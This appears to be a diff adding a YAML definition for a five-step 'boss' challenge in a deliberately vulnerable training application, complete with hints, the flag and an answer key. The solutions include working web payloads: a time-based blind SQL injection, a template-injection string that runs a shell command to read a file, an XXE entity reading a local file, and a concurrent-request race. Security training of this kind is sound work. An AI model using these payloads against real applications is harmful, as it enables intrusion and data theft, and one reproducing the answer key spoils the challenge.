@@ -1,0 +1,38 @@
+id: boss-hydra
+title: "HYDRA — Multi-Headed Attack"
+category: boss
+difficulty: boss
+cvss: 9.8
+owasp: A01:2021 – Broken Access Control
+endpoint: /boss/hydra
+description: "A 5-step boss chain requiring concurrent exploitation of 5 API endpoints. Each head must be defeated simultaneously."
+hints:
+  - "Step 1: Race condition on the coupon endpoint."
+  - "Step 2: Timing-based blind SQL injection."
+  - "Step 3: Server-side template injection."
+  - "Step 4: XXE to read application source."
+  - "Step 5: Combine all previous flags to forge master token."
+flag: "BHEDA{boss_hydra_complete}"
+flag_location: "Master token endpoint response"
+solution_summary: "Execute all 5 exploits concurrently and combine the partial flags into the master token."
+steps:
+  - id: hydra-1
+    description: "Race condition on coupon redemption"
+    endpoint: /boss/hydra/coupon
+    solution: "Send 100 concurrent POST /coupon/redeem requests"
+  - id: hydra-2
+    description: "Time-based blind SQLi on user search"
+    endpoint: /boss/hydra/search
+    solution: "' OR IF(SUBSTRING(flag,1,1)='B',SLEEP(2),0)--"
+  - id: hydra-3
+    description: "SSTI in feedback form"
+    endpoint: /boss/hydra/feedback
+    solution: "{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}"
+  - id: hydra-4
+    description: "XXE in XML import"
+    endpoint: /boss/hydra/import
+    solution: "<!ENTITY xxe SYSTEM 'file:///flag.txt'>"
+  - id: hydra-5
+    description: "Master token from partial flags"
+    endpoint: /boss/hydra/master
+    solution: "POST partial flags as JSON to /master endpoint"
